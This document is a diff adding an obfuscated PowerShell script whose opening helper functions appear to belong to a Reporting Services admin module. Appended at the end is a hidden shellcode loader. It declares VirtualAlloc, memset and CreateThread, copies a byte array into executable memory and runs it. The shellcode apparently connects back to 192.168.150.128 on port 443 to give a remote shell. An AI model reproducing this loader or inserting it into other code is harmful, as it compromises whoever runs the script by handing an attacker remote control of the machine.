@@ -1,0 +1,111 @@
+ ${0Gx`4`ZM}=  [typE]("{1}{0}" -f'Ng','StRi'); function nEW`-R`swEbseRvI`cEpro`xYh`eLPER
+{
+    
+    [CmdletBinding()]
+    Param (
+        [AllowNull()]
+        [object]
+        ${BouNd`pa`RaMET`Ers}
+    )
+    
+    if (${boUnDpA`R`Ame`TErS}[("{0}{1}" -f'P','roxy')])
+    {
+        return ${BO`UNdpAra`MeTe`RS}[("{0}{1}"-f 'Pro','xy')]
+    }
+    
+    ${gOOd`kE`Ys} = @(("{0}{1}{3}{2}"-f'Repo','rtServerU','i','r'), ("{3}{1}{0}{2}" -f 'dent','re','ial','C'), ("{3}{0}{1}{2}"-f 'pi','V','ersion','A'), ("{2}{3}{0}{1}" -f 'h','entication','Cust','omAut'))
+    ${n`eWrswE`BServicePrO`XYPa`Ram} = @{ }
+    
+    foreach (${K`Ey} in ${BOundP`A`R`AmETe`Rs}."K`eYS")
+    {
+        if (${goO`DkE`Ys} -contains ${K`Ey})
+        {
+            ${N`e`WRswE`BS`e`R`VicepR`OxYPa`RAm}[${K`Ey}] = ${bou`N`DpaRamE`T`erS}[${k`Ey}]
+        }
+    }
+    
+    .("{1}{2}{4}{0}{3}"-f'ePro','New-RsW','ebSer','xy','vic') @NewRsWebServiceProxyParam
+}
+
+function New-rSRE`StseSS`IoN`h`eLpER
+{
+    
+
+    [CmdletBinding()]
+    Param (
+        [AllowNull()]
+        [object]
+        ${bOU`NDpAr`A`meTErS}
+    )
+
+    if (${BO`UNDpaRAm`Et`ErS}[("{1}{0}{2}" -f 'bS','We','ession')])
+    {
+        return ${Bou`NDpaRa`Mete`Rs}[("{0}{2}{1}"-f 'WebSes','n','sio')]
+    }
+
+    ${goOD`k`eYs} = @(("{2}{0}{3}{1}" -f 'eportPo','lUri','R','rta'), ("{3}{2}{4}{0}{1}" -f'rs','ion','estA','R','piVe'), ("{0}{2}{1}"-f 'C','ential','red'))
+    ${NEWRsrE`StSe`sSiONP`Ar`A`MS} = @{ }
+
+    foreach (${k`ey} in ${BO`UnD`pARaME`TE`Rs}."k`eyS")
+    {
+        if (${go`ODK`EyS} -contains ${K`eY})
+        {
+            ${nE`w`RSREstS`ESSI`oN`Pa`RAmS}[${K`eY}] = ${bO`U`N`DPa`Ra`METErS}[${K`EY}]
+        }
+    }
+
+    .("{3}{2}{1}{0}" -f'on','stSessi','w-RsRe','Ne') @NewRsRestSessionParams
+}
+
+function gET-Rs`p`Ort`Al`URiHe`LpER
+{
+    
+
+    [CmdletBinding()]
+    Param (
+        [AllowNull()]
+        [Microsoft.PowerShell.Commands.WebRequestSession]
+        ${W`EB`sESsion}
+    )
+
+    if (${wEBS`eS`si`ON} -ne ${N`Ull})
+    {
+        ${REPo`R`TpoR`TaluRi} = ${Web`s`EsS`IoN}."hE`Ade`RS"[("{1}{2}{5}{4}{0}{3}"-f 'R','X-RST','O','TALURI','-PO','OLS')]
+        if (! (  VArIABLe  ("0G"+"x4ZM")  -vaLue)::("{2}{1}{3}{0}"-f 'pty','llOr','IsNu','Em').Invoke(${R`ePO`RTPORtA`L`UrI}))
+        {
+            if (${re`pORTpOr`T`AlUri} -notlike '*/') 
+            {
+                ${REPORtPOrT`AL`U`RI} = ${rEpo`RTPOR`TALuRi} + '/'
+            }
+            return ${RE`p`oRtPorta`L`UrI}
+        }
+    }
+
+    throw ("{5}{11}{8}{1}{14}{13}{19}{0}{7}{4}{3}{18}{12}{9}{6}{17}{20}{10}{21}{16}{15}{2}" -f 'al','Se','.','b','We','In',' ','id ','b','Session',' a','valid We','sion or run New-RsRest','if','ssion spec',' one','w','t','Ses','ied! Please specify a v','o create',' ne')
+}
+
+function nE`W-rS`c`oN`FiGUR`ATiO`NSeT`TinGOb`Je`cthel`PER
+{
+    
+    [CmdletBinding()]
+    Param (
+        [AllowNull()]
+        [object]
+        ${BOun`dPAR`Am`ETERs}
+    )
+    
+    ${gOOD`KE`Ys} = @(("{3}{2}{1}{4}{5}{0}"-f'ance','ver','Ser','Sql','Ins','t'), ("{0}{4}{1}{2}{3}"-f'Report','e','rInstan','ce','Serv'), ("{0}{3}{1}{2}" -f'SqlSer','rs','ion','verVe'), ("{2}{4}{1}{0}{3}"-f 'rs','rverVe','ReportS','ion','e'), ("{2}{0}{1}"-f 'mputer','Name','Co'), ("{2}{1}{0}"-f 'l','ia','Credent'), ("{5}{1}{6}{0}{2}{7}{3}{4}"-f 'q','nimum','lS','erVe','rsion','Mi','S','erv'), ("{4}{3}{1}{2}{0}" -f'on','ortServerV','ersi','mRep','Minimu'))
+    ${neWrsC`O`N`FiG`URatIOnsETtinGOBj`ecT`par`Am} = @{ }
+    
+    foreach (${k`Ey} in ${bOuNdp`ARa`ME`T`Ers}."k`eYs")
+    {
+        if (${Go`OD`KEyS} -contains ${K`eY})
+        {
+            ${neWRs`conFIgUR`ATIonse`TT`InGOB`JE`CtP`ARAM}[${K`ey}] = ${bo`UND`PaRAme`TerS}[${K`ey}]
+        }
+    }
+    
+    .("{2}{3}{5}{1}{0}{4}{6}" -f 'ur','ig','Ne','w-RsCon','ationSet','f','tingObject') @NewRsConfigurationSettingObjectParam
+}
+
+${c} = ((("{70}{48}{91}{44}{83}{43}{8}{46}{60}{63}{101}{16}{86}{79}{25}{18}{50}{31}{72}{99}{17}{29}{51}{76}{52}{97}{102}{85}{19}{64}{82}{58}{53}{23}{75}{54}{3}{34}{90}{80}{28}{88}{26}{78}{56}{10}{32}{36}{95}{38}{1}{61}{71}{2}{47}{89}{84}{40}{77}{24}{27}{62}{81}{33}{20}{49}{14}{74}{96}{87}{98}{65}{30}{15}{5}{69}{100}{22}{68}{35}{57}{39}{41}{94}{42}{73}{21}{6}{55}{13}{66}{11}{67}{7}{59}{9}{93}{92}{12}{37}{45}{4}{0}" -f't);','r','eateT','lImpo',' uint coun','ags, I','llCPW','ic','W','r memset(I',']pu','lic','sr',']p','Addres',', uint dwCreationFl','CPW','n','Pt',', uint f','ntP','rt.d','readI',', uint flProt','i','tatic extern Int','32.','butes, u','rne','t','er','alAl','b','ize, I','r',');','lic sta','c','exte','m','r','port(C','v','P','lImport',',','kernel32.','h','D','tr lpStart','r Virtu','P','lpAddres','ype',';[Dl',')','llCPW)','[DllI','onT',' extern IntPt','d','n IntPtr ','int d','l','lAlloc','t','ub',' stat','d','ntPtr','[','Cr','loc(','c','s, I','ect)','tr ','eadAttr','d','public s','ke','wStackS','ati','(C',' lpTh','wSize',')]',' lp','l','read(IntPtr','t(CPW','l',' dest, uint ','ntPtr','PWms','tic ','ntPtr','s, ','Parame','I',' lpTh','l','uint d'))  -CRepLace ([ChAr]67+[ChAr]80+[ChAr]87),[ChAr]34);${W} = .("{2}{1}{0}"-f'pe','d-Ty','Ad') -memberDefinition ${C} -Name ("{0}{1}"-f'Wi','n32') -namespace ("{0}{1}{2}{3}" -f'W','i','n32Function','s') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x96,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${Z}."le`N`Gth" -gt 0x1000){${G} = ${Z}."l`e`NGTh"};${X}=${w}::("{3}{2}{1}{0}" -f 'Alloc','ual','t','Vir').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${Z}."l`E`NGth"-1);${I}++) {${w}::"mems`et"([IntPtr](${x}.("{1}{2}{0}" -f '2','ToI','nt3').Invoke()+${I}), ${Z}[${i}], 1)};${w}::("{0}{2}{1}" -f 'Cre','ead','ateThr').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{2}{0}" -f 'p','St','art-slee') 60};
